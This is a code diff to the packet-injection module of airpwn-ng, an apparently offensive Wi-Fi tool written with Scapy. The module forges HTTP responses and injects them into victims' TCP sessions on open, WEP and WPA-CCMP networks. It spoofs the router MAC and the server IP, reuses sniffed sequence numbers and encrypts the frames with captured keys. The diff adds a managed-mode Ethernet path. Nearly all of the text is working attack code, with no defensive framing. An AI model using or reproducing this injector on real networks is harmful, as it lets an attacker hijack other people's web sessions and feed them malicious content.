@@ -21,8 +21,16 @@ class Injector(object):
 
         ## Create a header that works for encrypted wifi having FCS
         ### These bytes can be switched up, if memory serves, this is a channel 6 RadioTap()
-        rTap = '00 00 26 00 2f 40 00 a0 20 08 00 a0 20 08 00 00 20 c8 af c8 00 00 00 00 10 6c 85 09 c0 00 d3 00 00 00 d2 00 cd 01'
-        self.rTap = RadioTap(unhexlify(rTap.replace(' ', '')))
+        # rTap = '00 00 26 00 2f 40 00 a0 20 08 00 a0 20 08 00 00 20 c8 af c8 00 00 00 00 10 6c 85 09 c0 00 d3 00 00 00 d2 00 cd 01'
+        # self.rTap = RadioTap(unhexlify(rTap.replace(' ', '')))
+
+
+    def getHwAddr(self, ifname):
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
+        mac=':'.join(['%02x' % ord(char) for char in info[18:24]])
+        return mac
+
 
     def inject(self,
                vicmac,
@@ -45,67 +53,88 @@ class Injector(object):
         """
 
         ## HTML headers
-        headers = 'HTTP/1.1 200 OK\r\n'
-        headers += 'Date: ' + time.strftime('%a, %d %b %Y %H:%M:%S GMT', time.gmtime()) + '\r\n'
-        headers += 'Server: Apache\r\n'
-        headers += 'Content-Length: ' + str(len(injection)) + '\r\n'
-        headers += 'Connection: close\r\n'
-        headers += 'Content-Type: text/html\r\n'
-        headers += '\r\n'
+        headers =  '\r\n'.join(['HTTP/1.1 200 OK',
+                                'Date: {}'.format(time.strftime('%a, %d %b %Y %H:%M:%S GMT', time.gmtime())),
+                                'Server: Apache',
+                                'Content-Length: {}'.format(len(injection)),
+                                'Connection: close',
+                                'Content-Type: text/html\r\n\r\n'])
 
-        ## WEP/WPA
-        if self.args.wep or self.args.wpa:
-            packet = self.rTap\
-                    /Dot11(
-                          FCfield = 'from-DS',
-                          addr1 = vicmac,
-                          addr2 = rtrmac,
-                          addr3 = rtrmac,
-                          subtype = 8L,
-                          type = 2
-                          )\
-                    /Dot11QoS()\
-                    /LLC()\
-                    /SNAP()\
-                    /IP(
-                       dst = vicip,
-                       src = svrip
-                       )\
-                    /TCP(
-                        flags = 'FA',
-                        sport = int(svrport),
-                        dport = int(vicport),
-                        seq = int(seqnum),
-                        ack = int(acknum)
-                        )\
-                    /Raw(
-                        load = headers + injection
-                        )
-        ## Open
+        ## Monitor
+        if self.args.inj == 'mon':
+
+            ## WEP/WPA
+            if self.args.wep or self.args.wpa:
+                # packet = self.rTap\
+                packet = RadioTap()\
+                         /Dot11(
+                               FCfield = 'from-DS',
+                               addr1 = vicmac,
+                               addr2 = rtrmac,
+                               addr3 = rtrmac,
+                               subtype = 8L,
+                               type = 2
+                               )\
+                         /Dot11QoS()\
+                         /LLC()\
+                         /SNAP()\
+                         /IP(
+                            dst = vicip,
+                            src = svrip
+                            )\
+                         /TCP(
+                             flags = 'FA',
+                             sport = int(svrport),
+                             dport = int(vicport),
+                             seq = int(seqnum),
+                             ack = int(acknum)
+                             )\
+                         /Raw(
+                             load = headers + injection
+                             )
+            ## Open
+            else:
+                packet = RadioTap()\
+                         /Dot11(
+                               FCfield = 'from-DS',
+                               addr1 = vicmac,
+                               addr2 = rtrmac,
+                               addr3 = rtrmac
+                               )\
+                         /LLC()\
+                         /SNAP()\
+                         /IP(
+                            dst = vicip,
+                            src = svrip
+                            )\
+                         /TCP(
+                             flags = 'FA',
+                             sport = int(svrport),
+                             dport = int(vicport),
+                             seq = int(seqnum),
+                             ack = int(acknum)
+                             )\
+                         /Raw(
+                             load = headers + injection
+                             )
+
+        ## Managed
         else:
-            packet = RadioTap()\
-                    /Dot11(
-                          FCfield = 'from-DS',
-                          addr1 = vicmac,
-                          addr2 = rtrmac,
-                          addr3 = rtrmac
-                          )\
-                    /LLC()\
-                    /SNAP()\
-                    /IP(
-                       dst = vicip,
-                       src = svrip
-                       )\
-                    /TCP(
-                        flags = 'FA',
-                        sport = int(svrport),
-                        dport = int(vicport),
-                        seq = int(seqnum),
-                        ack = int(acknum)
+            packet = Ether(src = self.getHwAddr(self.interface), dst=vicmac)\
+                     /IP(
+                        dst = vicip,
+                        src = svrip
                         )\
-                    /Raw(
-                        load = headers + injection
-                        )
+                     /TCP(
+                         flags = 'FA',
+                         sport = int(svrport),
+                         dport = int(vicport),
+                         seq = int(seqnum),
+                         ack = int(acknum)
+                         )\
+                     /Raw(
+                         load = headers + injection
+                         )
 
         if TSVal is not None and TSecr is not None:
             packet[TCP].options = [
@@ -120,41 +149,44 @@ class Injector(object):
                                   ('Timestamp', ((round(time.time()), 0)))
                                   ]
 
-        ## WPA Injection
-        if self.args.wpa is not None:
-            if self.shake.encDict.get(vicmac) == 'ccmp':
-                try:
-                    self.shake.PN[5] += 1
-                except:
-                    self.shake.PN[4] += 1
-                packet = wpaEncrypt(self.shake.tgtInfo.get(vicmac)[1],
-                                    self.shake.origPkt,
-                                    packet,
-                                    self.shake.PN,
-                                    False) ### DEBUG SET TO FALSE FOR NOW
-            else:
-                print('[!] airpwn-ng cannot inject TKIP natively\n[!] Injection failed')
-                #packet = wpaEncrypt(self.shake.tgtInfo.get(vicmac)[0],
-                                    #self.shake.origPkt,
-                                    #packet,
-                                    #self.shake.PN,
-                                    #True)
+        ## Encrypt if using monitor mode
+        if self.args.inj == 'mon':
 
-            sendp(packet, iface = self.interface, verbose = False)
-            # gs(self.injSocket, packet, verbose = False)
+            ## WPA Injection
+            if self.args.wpa is not None:
 
-        ## WEP Injection
-        elif self.args.wep is not None:
-            packet = wepEncrypt(packet, self.args.wep)
-            sendp(packet, iface = self.interface, verbose = False)
-            # gs(self.injSocket, packet, verbose = False)
+                ## CCMP
+                if self.shake.encDict.get(vicmac) == 'ccmp':
+                    try:
+                        self.shake.PN[5] += 1
+                    except:
+                        self.shake.PN[4] += 1
+                    packet = wpaEncrypt(self.shake.tgtInfo.get(vicmac)[1],
+                                        self.shake.origPkt,
+                                        packet,
+                                        self.shake.PN,
+                                        False) ### DEBUG SET TO FALSE FOR NOW
 
-        ## Open WiFi Injection
-        else:
-            sendp(packet, iface = self.interface, verbose = False)
-            # gs(self.injSocket, packet, verbose = False)
-        # wrpcap('outbound.pcap', packet)
+                ## TKIP, use --inj man as a workaround
+                else:
+                    print('[!] airpwn-ng cannot inject TKIP natively\n[!] Injection failed\n[!] Use --inj "man" as a workaround')
+                    sys.exit()
+                    #packet = wpaEncrypt(self.shake.tgtInfo.get(vicmac)[0],
+                                        #self.shake.origPkt,
+                                        #packet,
+                                        #self.shake.PN,
+                                        #True)
 
+            ## WEP
+            elif self.args.wep is not None:
+                packet = wepEncrypt(packet, self.args.wep)
+
+
+        ## Inject
+        print(packet.show())
+        print(self.interface)
+        sendp(packet, iface = self.interface, verbose = False)
+        # gs(self.injSocket, packet, verbose = False)
         print('[*] Packet injected to {0}'.format(vicmac))
 
         ## Ought be classed up higher so as not to interfere unless warranted
